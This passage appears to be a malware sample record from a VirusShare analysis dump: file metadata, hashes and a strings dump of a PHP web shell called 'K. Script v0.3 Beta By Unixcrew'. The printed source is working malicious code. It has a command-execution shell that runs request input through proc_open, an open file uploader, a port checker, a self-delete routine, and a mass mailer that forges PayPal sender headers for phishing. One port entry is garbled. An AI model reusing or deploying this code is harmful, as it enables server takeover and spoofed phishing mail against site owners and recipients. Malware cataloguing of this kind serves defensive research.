size=\"20\"></div>\n\t<div style=\"padding-left: 33px;\">Subject: <input class=\"input\" type=\"text\" name=\"subject\" value=\"\" size=\"90\"></div>\n </div>\n\t<div align=\"left\"><span style=\"padding-left: 4px;\"></span>Letter:<span style=\"padding-left: 392px;\"></span>Recipients:</div>\n\t<div><textarea class=\"input\" name=\"message\" cols=\"50\" rows=\"10\"></textarea>\n\t<textarea class=\"input\" name=\"emaillist\" cols=\"25\" rows=\"10\"></textarea></div>\n\t\t</div>\n\t</div>\n</div>\n\n<div id=\"unCenter\">\n\t<div class=\"Marged\">\n\t\t<div class=\"Table\">\n<div align=\"center\"><input type=\"radio\" name=\"contenttype\" value=\"plain\">Plain\n\t<input type=\"radio\" name=\"contenttype\" value=\"html\" checked>HTML\n\t<input type=\"hidden\" name=\"action\" value=\"send\"><input class=\"input\" type=\"submit\" value=\"Send eMails\"></div>\n\t\t</div>\n\t</div>\n</div>\n</form>\n<?\nif ($action==\"send\"){\n\n\tif (!$from && !$subject && !$message && !$emaillist){\n\techo '<div id=\"unCenter\"><div class=\"Marged\"><div class=\"Table\"><center>\n\t<div>Please complete all fields before sending your message.</div>\n\t</center></div></div></div>';\n\techo $GraphicFooter;\n\texit;\n\t}\n\n\t$allemails = split(\"\\n\", $emaillist);\n\t$numemails = count($allemails);\n\n\t#Open the file attachment if any, and base64_encode it for email transport\n\tIf ($file_name){\n\t\t@copy($file, \"./$file_name\") or die(\"The file you are trying to upload couldn't be copied to the server\");\n\t\t$content = fread(fopen($file,\"r\"),filesize($file));\n\t\t$content = chunk_split(base64_encode($content));\n\t\t$uid = strtoupper(md5(uniqid(time())));\n\t\t$name = basename($file);\n\t}\n\techo '<div id=\"unCenter\"><div class=\"Marged\"><div class=\"Table\"><center>';\n\n\tfor($x=0; $x<$numemails; $x++){\n\t\t$to = $allemails[$x];\n\t\tif ($to){\n\t\t$to = ereg_replace(\" \", \"\", $to);\n\t\t$message = ereg_replace(\"&email&\", $to, $message);\n\t\t$subject = ereg_replace(\"&email&\", $to, $subject);\n\t\tprint \"Sending: [ $to ] \";\n\t\tflush();\n\t\t$header = \"From: $realname <$from>\\r\\n\";\n\t\t$header .= \"Reply-To: $replyto\\r\\n\";\n\t\t$header .= \"MIME-Version: 1.0\\r\\n\";\n\t\tIf ($file_name) $header .= \"Content-Type: multipart/mixed; boundary=$uid\\r\\n\";\n\t\tIf ($file_name) $header .= \"--$uid\\r\\n\";\n\t\t$header .= \"Message-Id:<1130384585.13653@paypal.com>\\r\\n\";\n\t\t$header .= \"Return-Path: <service@paypal.com>\\r\\n\";\n\t\t$header .= \"Content-Type: text/$contenttype\\r\\n\";\n\t\t$header .= \"Content-Transfer-Encoding: 8bit\\r\\n\\r\\n\";\n\t\t$header .= \"$message\\r\\n\";\n\t\tIf ($file_name) $header .= \"--$uid\\r\\n\";\n\t\tIf ($file_name) $header .= \"Content-Type: $file_type; name=\\\"$file_name\\\"\\r\\n\";\n\t\tIf ($file_name) $header .= \"Content-Transfer-Encoding: base64\\r\\n\";\n\t\tIf ($file_name) $header .= \"Content-Disposition: attachment; filename=\\\"$file_name\\\"\\r\\n\\r\\n\";\n\t\tIf ($file_name) $header .= \"$content\\r\\n\";\n\t\tIf ($file_name) $header .= \"--$uid--\";\n\t\tmail($to, $subject, \"\", $header);\n\t\tprint \"........Success!<br>\";\n\t\tflush();\n\t\t}\n\t}\necho \"</center></div></div></div>\";\n}\n?>\n<!-- </Mailer> -->\n<? echo $GraphicFooter; } ?>\n\n<? if(isset($_GET['DeleteMe'])){\necho '<html><head><title>'.$Title.' DeleteMe</title>';\necho $GraphicHeader; echo $SiteHeader;\nif($del){\n$url = \"http://\" .$_SERVER['HTTP_HOST']. \"/\";\nprint \"<META HTTP-EQUIV=\\\"Refresh\\\" CONTENT=\\\"0; URL= $url \\\">\";\nunlink('kscr.php');\n}\n?>\n<!-- <DeleteMeGraphic> -->\n<div id=\"unCenter\">\n\t<div class=\"Marged\">\n\t\t<div class=\"Table\">\n\t\t\t<center>\n\t\t\t<div></div>\n\t\t\t<div style=\"font-size 10px: bold; font-weight: bold;\">Delete Me?</div>\n\t\t\t<br>\n\t\t\t<div><a href=\"?DeleteMe&del=TRUE\">Yes (Delete)</a><img src=\"\" border=\"0\" height=\"0\" width=\"50\"><a href=\"?MainPage\">No (Go Home)</a></div>\n\t\t\t</center>\n\t\t</div>\n\t</div>\n</div>\n<!-- </DeleteMeGaphic> -->\n<? echo $GraphicFooter; } ?>"
    },
    "filename": "VirusShare_35a532046eacb06491c2f143ea75a668",
    "filesize": 27480,
    "filetype": "PHP script, ASCII text, with very long lines, with CRLF line terminators",
    "hashes": {
        "md5": "35a532046eacb06491c2f143ea75a668",
        "sha1": "45b6ff1becaec9b0eded41aff3b7e9ddeb37271c",
        "sha256": "8dc83543f198f0db02cf31fab2eb9a9e004bd4610eb90c5c227d4d570dea59c4"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<?php",
            "/* <Settings> */",
            "$Title = \"K. Script v0.3 Beta By Unixcrew: \";",
            "$GraphicHeader = '<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1257\">",
            "\t<style type=\"text/css\">",
            "\t\tbody{",
            "\t\t\tbackground-color: #F6F6F6;",
            "\t\t\ttext-align: center;",
            "\t\t\twidth: 100%;",
            "\t\t\tpadding: 0px;",
            "\t\t\tmargin: 0px;",
            "\t\t#unCenter{",
            "\t\t\twidth: 300px;",
            "\t\t\tmargin-left: auto;",
            "\t\t\tmargin-right: auto;",
            "\t\t\ttext-align: left;",
            "\t\t#unCenterShell{",
            "\t\t\t\t\twidth: 500px;",
            "\t\t\t\t\tmargin-left: auto;",
            "\t\t\t\t\tmargin-right: auto;",
            "\t\t\ttext-align: left;",
            "\t\t#unCenterShell{",
            "\t\t\t\t\twidth: 700px;",
            "\t\t\t\t\tmargin-left: auto;",
            "\t\t\t\t\tmargin-right: auto;",
            "\t\t.Marged{",
            "\t\t\tmargin-top: 20px;",
            "\t\t.Input{",
            "\t\tborder: 1px solid #DADADA;",
            "\t\t.Table{",
            "\t\t\tborder: 1px solid #DADADA;",
            "\t\t\tbackground-color: White;",
            "\t\t\tpadding: 10px;",
            "\t\t\tfont: 11px Tahoma, Verdana, sans-serif;",
            "\t\t\tline-height: 17px;",
            "\t\t\tcolor: Gray;",
            "\t\ta{",
            "\t\t\ttext-decoration: none;",
            "\t\t\tcolor: #003473;",
            "\t\ta:hover{",
            "\t\t\ttext-decoration: none;",
            "\t\t\tcolor: #F5822B;",
            "\t\timg{",
            "\t\t\tborder: 0px;",
            "\t\th1{",
            "\t\t\tfont-size: 14px;",
            "\t\t\tfont-weight: bold;",
            "\t\t\tpadding: 0px;",
            "\t\t\tmargin-bottom: 7px;",
            "\t\t.Black{",
            "\t\t\tcolor: Gray;",
            "\t\t\tfont: 11px Tahoma, Verdana, sans-serif;",
            "\t\t.BlackRealy{",
            "\t\t\tcolor: Black;",
            "\t\t\tfont: 12px Tahoma, Verdana, sans-serif;",
            "\t</style>';",
            "\t$SiteHeader = '</head><body><br>",
            "\t<a href=\"?MainPage\"><img src=\"http://kileris.net/images/fuck.gif\" width=\"50\" height=\"50\" alt=\"Home\"></a><hr width=\"90%\">';",
            "\t$GraphicFooter = '<hr width=\"90%\">",
            "\t<div align=\"center\" class=\"black\">[<a href=\"?Uploader\">FileUploader</a>]<span class=\"BlackRealy\">  |  </span>[<a href=\"?PHPShell\">PHPShell</a>]<span class=\"BlackRealy\">  |  </span>[<a href=\"?PortCheck\">PortCheck</a><span class=\"BlackRealy\">  |  </span>[<a href=\"?Mailer\">MassMailer</a>]<span class=\"BlackRealy\">  |  </span>[<a href=\"?DeleteMe\">Delete Me</a>]</div>",
            "<div><img width=\"1\" height=\"1\" ></div>",
            "\t<div align=\"center\" class=\"Black\">Copyright &copy; 2005 <a href=\"mailto:Gadamnit@gmail.com\">Unixcrew</a></div>",
            "</body></html>';",
            "/* </Settings> */",
            "if ($_SERVER['QUERY_STRING'] == '') {",
            "header(\"Location: http://\" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . \"?MainPage\");",
            "if(isset($_GET['PHPShell'])) {",
            "/* <ShellScript> */",
            "$passwd = array();",
            "$aliases = array();",
            "session_start();",
            "if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {",
            "    $_SESSION['cwd'] = getcwd();",
            "    $_SESSION['history'] = array();",
            "    $_SESSION['output'] = '';",
            "  if (!empty($_REQUEST['command'])) {",
            "    if (get_magic_quotes_gpc()) {",
            "      $_REQUEST['command'] = stripslashes($_REQUEST['command']);",
            "    }",
            "   if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)",
            "      unset($_SESSION['history'][$i]);",
            "    array_unshift($_SESSION['history'], $_REQUEST['command']);",
            "    $_SESSION['output'] .= '$ ' . $_REQUEST['command'] . \"\\n\";",
            "    /* Initialize the current working directory. */",
            "    if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {",
            "      $_SESSION['cwd'] = dirname(__FILE__);",
            "    } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs)) {",
            "      /* The current command is a 'cd' command which we have to handle",
            "       * as an internal shell command. */",
            "      if ($regs[1][0] == '/') {",
            "        /* Absolute path, we use it unchanged. */",
            "        $new_dir = $regs[1];",
            "      } else {",
            "        /* Relative path, we append it to the current working",
            "         * directory. */",
            "        $new_dir = $_SESSION['cwd'] . '/' . $regs[1];",
            "      }",
            "      /* Transform '/./' into '/' */",
            "      while (strpos($new_dir, '/./') !== false)",
            "        $new_dir = str_replace('/./', '/', $new_dir);",
            "      /* Transform '//' into '/' */",
            "      while (strpos($new_dir, '//') !== false)",
            "        $new_dir = str_replace('//', '/', $new_dir);",
            "      /* Transform 'x/..' into '' */",
            "      while (preg_match('|/\\.\\.(?!\\.)|', $new_dir))",
            "        $new_dir = preg_replace('|/?[^/]+/\\.\\.(?!\\.)|', '', $new_dir);",
            "      if ($new_dir == '') $new_dir = '/';",
            "      /* Try to change directory. */",
            "      if (@chdir($new_dir)) {",
            "        $_SESSION['cwd'] = $new_dir;",
            "      } else {",
            "        $_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";",
            "      }",
            "    } else {",
            "      /* The command is not a 'cd' command, so we execute it after",
            "       * changing the directory and save the output. */",
            "      chdir($_SESSION['cwd']);",
            "      /* Alias expansion. */",
            "      $length = strcspn($_REQUEST['command'], \" \\t\");",
            "      $token = substr($_REQUEST['command'], 0, $length);",
            "      if (isset($aliases[$token]))",
            "        $_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);",
            "      $p = proc_open($_REQUEST['command'],",
            "                     array(1 => array('pipe', 'w'),",
            "                           2 => array('pipe', 'w')),",
            "                     $io);",
            "      /* Read output sent to stdout. */",
            "      while (!feof($io[1])) {",
            "        $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),",
            "                                                ENT_COMPAT, 'UTF-8');",
            "      }",
            "      /* Read output sent to stderr. */",
            "      while (!feof($io[2])) {",
            "        $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),",
            "                                                ENT_COMPAT, 'UTF-8');",
            "      }",
            "      fclose($io[1]);",
            "      fclose($io[2]);",
            "      proc_close($p);",
            "    }",
            "  /* Build the command history for use in the JavaScript */",
            "  if (empty($_SESSION['history'])) {",
            "    $js_command_hist = '\"\"';",
            "  } else {",
            "    $escaped = array_map('addslashes', $_SESSION['history']);",
            "    $js_command_hist = '\"\", \"' . implode('\", \"', $escaped) . '\"';",
            "echo '<xml version=\"1.0\" encoding=\"UTF-8\">';",
            "echo '<html><head><title>'.$Title.' PHPShell</title>';",
            "echo $GraphicHeader;",
            "<!-- </ShellScript> -->",
            "<!-- <ShellGraphic> -->",
            "<script type=\"text/javascript\" language=\"JavaScript\">",
            "  var current_line = 0;",
            "  var command_hist = new Array(<?php echo $js_command_hist ?>);",
            "  var last = 0;",
            "  function key(e) {",
            "    if (!e) var e = window.event;",
            "    if (e.keyCode == 38 && current_line < command_hist.length-1) {",
            "      command_hist[current_line] = document.shell.command.value;",
            "      current_line++;",
            "      document.shell.command.value = command_hist[current_line];",
            "    }",
            "    if (e.keyCode == 40 && current_line > 0) {",
            "      command_hist[current_line] = document.shell.command.value;",
            "      current_line--;",
            "      document.shell.command.value = command_hist[current_line];",
            "    }",
            "function init() {",
            "  document.shell.setAttribute(\"autocomplete\", \"off\");",
            "  document.shell.output.scrollTop = document.shell.output.scrollHeight;",
            "  document.shell.command.focus();",
            "  </script>",
            "<? echo $SiteHeader; ?>",
            "<body onload=\"init()\">",
            "<?php",
            "error_reporting (E_ALL);",
            "if (empty($_REQUEST['rows'])) $_REQUEST['rows'] = 10;",
            "<div id=\"unCenterShell\">",
            "\t<div class=\"Marged\">",
            "\t\t<div class=\"Table\">",
            "\t\t\t<center>",
            "\t\t\t<div>Current Directory: <?php echo $_SESSION['cwd'] ?></div>",
            "\t\t\t</center>",
            "\t\t</div>",
            "\t</div>",
            "</div>",
            "<div id=\"unCenterShell\">",
            "\t<div class=\"Marged\">",
            "\t\t<div class=\"Table\">",
            "\t\t\t<center>",
            "\t\t\t<div><form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ..'?PHPShell'?>\" method=\"post\"></div>",
            "\t\t\t<div>",
            "\t<textarea class=\"Input\" name=\"output\" readonly=\"readonly\" cols=\"55\" rows=\"<?php echo $_REQUEST['rows'] ?>\">",
            "\t<?php",
            "\t$lines = substr_count($_SESSION['output'], \"\\n\");",
            "\t$padding = str_repeat(\"\\n\", max(0, $_REQUEST['rows']+1 - $lines));",
            "\techo rtrim($padding . $_SESSION['output']);",
            "\t</textarea>",
            "\t\t\t</div>",
            "\t<div>$&nbsp;&nbsp;<input class=\"Input\" name=\"command\" type=\"text\" onkeyup=\"key(event)\" size=\"72\" tabindex=\"1\"><div>",
            "\t\t\t</center>",
            "\t\t</div>",
            "\t</div>",
            "</div>",
            "<div id=\"unCenter\">",
            "\t<div class=\"Marged\">",
            "\t\t<div class=\"Table\">",
            "\t\t\t<center>",
            "\t\t\t<div><input type=\"submit\" value=\"Execute Command\" />&nbsp;<input type=\"submit\" name=\"reset\" value=\"Reset\" /></div>",
            "\t\t\t<div>Rows: <input type=\"text\" name=\"rows\" value=\"<?php echo $_REQUEST['rows'] ?>\" /></div>",
            "\t\t</form>",
            "\t\t\t</center>",
            "\t\t</div>",
            "\t</div>",
            "</div>",
            "<!-- </ShellGraphic> -->",
            "<? echo $GraphicFooter; } ?>",
            "<? if(isset($_GET['Uploader'])){",
            "echo '<html><head><title>'.$Title.' Uploader</title>';",
            "echo $GraphicHeader; echo $SiteHeader;  ?>",
            "<!-- <MassUploaderScript> -->",
            "<?php",
            "if(isset($_POST['upl_files'])){",
            "  echo '<div id=\"unCenter\"><div class=\"Marged\"><div class=\"Table\">",
            "\t\t<div>Uploaded Files:<br></div>';",
            "  //print_r($_FILES['file_n']);",
            "  $up_mas = $_FILES['file_n'];",
            "  $mas_name = array();",
            "  $mas_tmp = array();",
            "  for($i=0; $i<10; $i++){",
            "    if(!empty($up_mas['name'][$i])){",
            "      $j = count($mas_name);",
            "      $mas_name[$j] = $up_mas['name'][$i];",
            "      $mas_tmp[$j] = $up_mas['tmp_name'][$i];",
            "      }",
            "    }",
            "  for($i=0; $i<count($mas_name); $i++){",
            "    $upl_file = './'.$mas_name[$i];",
            "    if(move_uploaded_file($mas_tmp[$i], $upl_file)){",
            "      echo '<a href=\"'.$mas_name[$i].'\">'.$mas_name[$i].'</a>,&nbsp';",
            "      }",
            "    }",
            "echo \"</div></div></div>\";",
            "<!-- </MassUploaderScript> -->",
            "<!-- <MassUploaderGraphic> -->",
            "<div id=\"unCenter\">",
            "\t<div class=\"Marged\">",
            "\t\t<div class=\"Table\">",
            "\t\t\t<center>",
            "\t\t\t<br>",
            "\t\t\t<form enctype=\"multipart/form-data\" method=\"post\" action=\"\">",
            "\t\t\t<div>",
            "\t\t\t<?php",
            " \t\t for($i=0; $i<10; $i++){",
            "  \t\t  echo '<div><input class=\"Input\" type=\"file\" name=\"file_n[]\"></div>';",
            "  \t\t  } ?>",
            "  \t\t  </div>",
            "  \t\t  <div><input type=\"reset\" name=\"reset\" value=\"Reset\">&nbsp;<input type=\"submit\" name=\"upl_files\" value=\"upload\"></div>",
            "\t\t\t</center>",
            "\t\t</div>",
            "\t</div>",
            "</div>",
            "<!-- </MassUploaderGraphic> -->",
            "<? echo $GraphicFooter; } ?>",
            "<? if(isset($_GET['MainPage'])){",
            "echo '<html><head><title>'.$Title.'</title>';",
            "echo $GraphicHeader; echo $SiteHeader; ?>",
            "<!-- <MainPageGraphic> -->",
            "<div id=\"unCenter\">",
            "\t<div class=\"Marged\">",
            "\t\t<div class=\"Table\">",
            "\t\t\t<center>",
            "\t\t\t<div></div>",
            "\t\t\t<div><a href=\"?Uploader\">FileUploader</a></div>",
            "\t\t\t<div><a href=\"?PHPShell\">PHPShell</a></div>",
            "\t\t\t<div><a href=\"?PortCheck\">PortCheck</a></div>",
            "\t\t\t<div><a href=\"?Mailer\">MassMailer</a></div>",
            "\t\t\t<div><hr width=\"200\"></div>",
            "\t\t\t<div><a href=\"?DeleteMe\">Delete me</a></div>",
            "\t\t\t</center>",
            "\t\t</div>",
            "\t</div>",
            "</div>",
            "<!-- <MainPageGraphic> -->",
            "<? echo $GraphicFooter; } ?>",
            "<!-- <PortCheck> -->",
            "<? if(isset($_GET['PortCheck'])) {",
            "echo '<html><head><title>'.$Title.' PortCheck</title>';",
            "echo $GraphicHeader; echo $SiteHeader;",
            "$ip = getenv (\"REMOTE_ADDR\");",
            "$client_ip = getenv (\"HTTP_CLIENT_IP\");",
            "$forward = getenv (\"HTTP_X_FORWARDED_FOR\");",
            "$via = getenv (\"HTTP_VIA\");",
            "if (($ip == $client_ip) || ($client_ip == NULL)) {",
            "    $host = $ip;",
            "} else if (($via) || ($forward)) {",
            "    $host = $client_ip;",
            "if( $_GET['port'] == \"\") {",
            "$ports=\"20 21 22 23 25 37 53 67 79 80 110 137 138 139 143 443 993 995 2082 1080 8080 8181\";",
            "} else {",
            "$ports=$_GET['port'];",
            "$arr[1] = \"tcpmux (TCP Port Service Multiplexer)\";",
            "$arr[2] = \"Management Utility\";",
            "$arr[3] = \"Compression Process\";",
            "$arr[5] = \"rje (Remote Job Entry)\";",
            "$arr[7] = \"echo\";",
            "$arr[9] = \"discard\";",
            "$arr[11] = \"systat\";",
            "$arr[13] = \"daytime\";",
            "$arr[15] = \"netstat\";",
            "$arr[17] = \"quote of the day\";",
            "$arr[18] = \"send/rwp\";",
            "$arr[19] = \"character generator\";",
            "$arr[20] = \"ftp-data\";",
            "$arr[21] = \"ftp\";",
            "$arr[22] = \"ssh, pcAnywhere\";",
            "$arr[23] = \"Telnet\";",
            "$arr[25] = \"SMTP (Simple Mail Transfer)\";",
            "$arr[27] = \"ETRN (NSW User System FE)\";",
            "$arr[29] = \"MSG ICP\";",
            "$arr[31] = \"MSG Authentication\";",
            "$arr[33] = \"dsp (Display Support Protocol)\";",
            "$arr[37] = \"time\";",
            "$arr[38] = \"RAP (Route Access Protocol)\";",
            "$arr[39] = \"rlp (Resource Location Protocol)\";",
            "$arr[41] = \"Graphics\";",
            "$arr[42] = \"nameserv, WINS\";",
            "$arr[43] = \"whois, nickname\";",
            "$arr[44] = \"MPM FLAGS Protocol\";",
            "$arr[45] = \"Message Processing Module [recv]\";",
            "$arr[46] = \"MPM [default send]\";",
            "$arr[47] = \"NI FTP\";",
            "$arr[48] = \"Digital Audit Daemon\";",
            "$arr[49] = \"TACACS, Login Host Protocol\";",
            "$arr[50] = \"RMCP, re-mail-ck\";",
            "$arr[53] = \"DNS\";",
            "$arr[57] = \"MTP (any private terminal access)\";",
            "$arr[59] = \"NFILE\";",
            "$arr[60] = \"Unassigned\";",
            "$arr[61] = \"NI MAIL\";",
            "$arr[62] = \"ACA Services\";",
            "$arr[63] = \"whois++\";",
            "$arr[64] = \"Communications Integrator (CI)\";",
            "$arr[65] = \"TACACS-Database Service\";",
            "$arr[66] = \"Oracle SQL*NET\";",
            "$arr[67] = \"bootps (Bootstrap Protocol Server)\";",
            "$arr[68] = \"bootpd/dhcp (Bootstrap Protocol Client)\";",
            "$arr[69] = \"Trivial File Transfer Protocol (tftp)\";",
            "$arr[70] = \"Gopher\";",
            "$arr[71] = \"Remote Job Service\";",
            "$arr[72] = \"Remote Job Service\";",
            "$arr[73] = \"Remote Job Service\";",
            "$arr[74] = \"Remote Job Service\";",
            "$arr[75] = \"any private dial out service\";",
            "$arr[76] = \"Distributed External Object Store\";",
            "$arr[77] = \"any private RJE service\";",
            "$arr[78] = \"vettcp\";",
            "$arr[79] = \"finger\";",
            "$arr[80] = \"World Wide Web HTTP\";",
            "$arr[81] = \"HOSTS2 Name Serve\";",
            "$arr[82] = \"XFER Utility\";",
            "$arr[83] = \"MIT ML Device\";",
            "$arr[84] = \"Common Trace Facility\";",
            "$arr[85] = \"MIT ML Device\";",
            "$arr[86] = \"Micro Focus Cobol\";",
            "$arr[87] = \"any private terminal link\";",
            "$arr[88] = \"Kerberos, WWW\";",
            "$arr[89] = \"SU/MIT Telnet Gateway\";",
            "$arr[90] = \"DNSIX Securit Attribute Token Map\";",
            "$arr[91] = \"MIT Dover Spooler\";",
            "$arr[92] = \"Network Printing Protocol\";",
            "$arr[93] = \"Device Control Protocol\";",
            "$arr[94] = \"Tivoli Object Dispatcher\";",
            "$arr[95] = \"supdup\";",
            "$arr[96] = \"DIXIE\";",
            "$arr[98] = \"linuxconf\";",
            "$arr[99] = \"Metagram Relay\";",
            "$arr[100] = \"[unauthorized use]\";",
            "$arr[101] = \"HOSTNAME\";",
            "$arr[102] = \"ISO, X.400, ITOT\";",
            "$arr[103] = \"Genesis Point-to&#14144;&#429;oi&#65535;&#65535; T&#0;&#0;ns&#0;&#0;et\";",
            "$arr[104] = \"ACR-NEMA Digital Imag. & Comm. 300\";",
            "$arr[105] = \"CCSO name server protocol\";",
            "$arr[106] = \"poppassd\";",
            "$arr[107] = \"Remote Telnet Service\";",
            "$arr[108] = \"SNA Gateway Access Server\";",
            "$arr[109] = \"POP2\";",
            "$arr[110] = \"POP3\";",
            "$arr[111] = \"Sun RPC Portmapper\";",
            "$arr[112] = \"McIDAS Data Transmission Protocol\";",
            "$arr[113] = \"Authentication Service\";",
            "$arr[115] = \"sftp (Simple File Transfer Protocol)\";",
            "$arr[116] = \"ANSA REX Notify\";",
            "$arr[117] = \"UUCP Path Service\";",
            "$arr[118] = \"SQL Services\";",
            "$arr[119] = \"NNTP\";",
            "$arr[120] = \"CFDP\";",
            "$arr[123] = \"NTP\";",
            "$arr[124] = \"SecureID\";",
            "$arr[129] = \"PWDGEN\";",
            "$arr[133] = \"statsrv\";",
            "$arr[135] = \"loc-srv/epmap\";",
            "$arr[137] = \"netbios-ns\";",
            "$arr[138] = \"netbios-dgm (UDP)\";",
            "$arr[139] = \"NetBIOS\";",
            "$arr[143] = \"IMAP\";",
            "$arr[144] = \"NewS\";",
            "$arr[150] = \"SQL-NET\";",
            "$arr[152] = \"BFTP\";",
            "$arr[153] = \"SGMP\";",
            "$arr[156] = \"SQL Service\";",
            "$arr[161] = \"SNMP\";",
            "$arr[175] = \"vmnet\";",
            "$arr[177] = \"XDMCP\";",
            "$arr[178] = \"NextStep Window Server\";",
            "$arr[179] = \"BGP\";",
            "$arr[180] = \"SLmail admin\";",
            "$arr[199] = \"smux\";",
            "$arr[210] = \"Z39.50\";",
            "$arr[213] = \"IPX\";",
            "$arr[218] = \"MPP\";",
            "$arr[220] = \"IMAP3\";",
            "$arr[256] = \"RAP\";",
            "$arr[257] = \"Secure Electronic Transaction\";",
            "$arr[258] = \"Yak Winsock Personal Chat\";",
            "$arr[259] = \"ESRO\";",
            "$arr[264] = \"FW1_topo\";",
            "$arr[311] = \"Apple WebAdmin\";",
            "$arr[350] = \"MATIP type A\";",
            "$arr[351] = \"MATIP type B\";",
            "$arr[363] = \"RSVP tunnel\";",
            "$arr[366] = \"ODMR (On-Demand Mail Relay)\";",
            "$arr[371] = \"Clearcase\";",
            "$arr[387] = \"AURP (AppleTalk Update-Based Routing Protocol)\";",
            "$arr[389] = \"LDAP\";",
            "$arr[407] = \"Timbuktu\";",
            "$arr[427] = \"Server Location\";",
            "$arr[434] = \"Mobile IP\";",
            "$arr[443] = \"ssl\";",
            "$arr[444] = \"snpp, Simple Network Paging Protocol\";",
            "$arr[445] = \"SMB\";",
            "$arr[458] = \"QuickTime TV/Conferencing\";",
            "$arr[468] = \"Photuris\";",
            "$arr[475] = \"tcpnethaspsrv\";",
            "$arr[500] = \"ISAKMP, pluto\";",
            "$arr[511] = \"mynet-as\";",
            "$arr[512] = \"biff, rexec\";",
            "$arr[513] = \"who, rlogin\";",
            "$arr[514] = \"syslog, rsh\";",
            "$arr[515] = \"lp, lpr, line printer\";",
            "$arr[517] = \"talk\";",
            "$arr[520] = \"RIP (Routing Information Protocol)\";",
            "$arr[521] = \"RIPng\";",
            "$arr[522] = \"ULS\";",
            "$arr[531] = \"IRC\";",
            "$arr[543] = \"KLogin, AppleShare over IP\";",
            "$arr[545] = \"QuickTime\";",
            "$arr[548] = \"AFP\";",
            "$arr[554] = \"Real Time Streaming Protocol\";",
            "$arr[555] = \"phAse Zero\";",
            "$arr[563] = \"NNTP over SSL\";",
            "$arr[575] = \"VEMMI\";",
            "$arr[581] = \"Bundle Discovery Protocol\";",
            "$arr[593] = \"MS-RPC\";",
            "$arr[608] = \"SIFT/UFT\";",
            "$arr[626] = \"Apple ASIA\";",
            "$arr[631] = \"IPP (Internet Printing Protocol)\";",
            "$arr[635] = \"RLZ DBase\";",
            "$arr[636] = \"sldap\";",
            "$arr[642] = \"EMSD\";",
            "$arr[648] = \"RRP (NSI Registry Registrar Protocol)\";",
            "$arr[655] = \"tinc\";",
            "$arr[660] = \"Apple MacOS Server Admin\";",
            "$arr[666] = \"Doom\";",
            "$arr[674] = \"ACAP\";",
            "$arr[687] = \"AppleShare IP Registry\";",
            "$arr[700] = \"buddyphone\";",
            "$arr[705] = \"AgentX for SNMP\";",
            "$arr[901] = \"swat, realsecure\";",
            "$arr[993] = \"s-imap\";",
            "$arr[995] = \"s-pop\";",
            "$arr[1024] = \"Reserved\";",
            "$arr[1025] = \"network blackjack\";",
            "$arr[1062] = \"Veracity\";",
            "$arr[1080] = \"SOCKS\";",
            "$arr[1085] = \"WebObjects\";",
            "$arr[1227] = \"DNS2Go\";",
            "$arr[1243] = \"SubSeven\";",
            "$arr[1338] = \"Millennium Worm\";",
            "$arr[1352] = \"Lotus Notes\";",
            "$arr[1381] = \"Apple Network License Manager\";",
            "$arr[1417] = \"Timbuktu Service 1 Port\";",
            "$arr[1418] = \"Timbuktu Service 2 Port\";",
            "$arr[1419] = \"Timbuktu Service 3 Port\";",
            "$arr[1420] = \"Timbuktu Service 4 Port\";",
            "$arr[1433] = \"Microsoft SQL Server\";",
            "$arr[1434] = \"Microsoft SQL Monitor\";",
            "$arr[1477] = \"ms-sna-server\";",
            "$arr[1478] = \"ms-sna-base\";",
            "$arr[1490] = \"insitu-conf\";",
            "$arr[1494] = \"Citrix ICA Protocol\";",
            "$arr[1498] = \"Watcom-SQL\";",
            "$arr[1500] = \"VLSI License Manager\";",
            "$arr[1503] = \"T.120\";",
            "$arr[1521] = \"Oracle SQL\";",
            "$arr[1522] = \"Ricardo North America License Manager\";",
            "$arr[1524] = \"ingres\";",
            "$arr[1525] = \"prospero\";",
            "$arr[1526] = \"prospero\";",
            "$arr[1527] = \"tlisrv\";",
            "$arr[1529] = \"oracle\";",
            "$arr[1547] = \"laplink\";",
            "$arr[1604] = \"Citrix ICA, MS Terminal Server\";",
            "$arr[1645] = \"RADIUS Authentication\";",
            "$arr[1646] = \"RADIUS Accounting\";",
            "$arr[1680] = \"Carbon Copy\";",
            "$arr[1701] = \"L2TP/LSF\";",
            "$arr[1717] = \"Convoy\";",
            "$arr[1720] = \"H.323/Q.931\";",
            "$arr[1723] = \"PPTP control port\";",
            "$arr[1731] = \"MSICCP\";",
            "$arr[1755] = \"Windows Media .asf\";",
            "$arr[1758] = \"TFTP multicast\";",
            "$arr[1761] = \"cft-0\";",
            "$arr[1762] = \"cft-1\";",
            "$arr[1763] = \"cft-2\";",
            "$arr[1764] = \"cft-3\";",
            "$arr[1765] = \"cft-4\";",
            "$arr[1766] = \"cft-5\";",
            "$arr[1767] = \"cft-6\";",
            "$arr[1808] = \"Oracle-VP2\";",
            "$arr[1812] = \"RADIUS server\";",
            "$arr[1813] = \"RADIUS accounting\";",
            "$arr[1818] = \"ETFTP\";",
            "$arr[1973] = \"DLSw DCAP/DRAP\";",
            "$arr[1985] = \"HSRP\";",
            "$arr[1999] = \"Cisco AUTH\";",
            "$arr[2001] = \"glimpse\";",
            "$arr[2049] = \"NFS\";",
            "$arr[2064] = \"distributed.net\";",
            "$arr[2065] = \"DLSw\";",
            "$arr[2066] = \"DLSw\";",
            "$arr[2106] = \"MZAP\";",
            "$arr[2140] = \"DeepThroat\";",
            "$arr[2301] = \"Compaq Insight Management Web Agents\";",
            "$arr[2327] = \"Netscape Conference\";",
            "$arr[2336] = \"Apple UG Control\";",
            "$arr[2427] = \"MGCP gateway\";",
            "$arr[2504] = \"WLBS\";",
            "$arr[2535] = \"MADCAP\";",
            "$arr[2543] = \"sip\";",
            "$arr[2592] = \"netrek\";",
            "$arr[2727] = \"MGCP call agent\";",
            "$arr[2628] = \"DICT\";",
            "$arr[2998] = \"ISS Real Secure Console Service Port\";",
            "$arr[3000] = \"Firstclass\";",
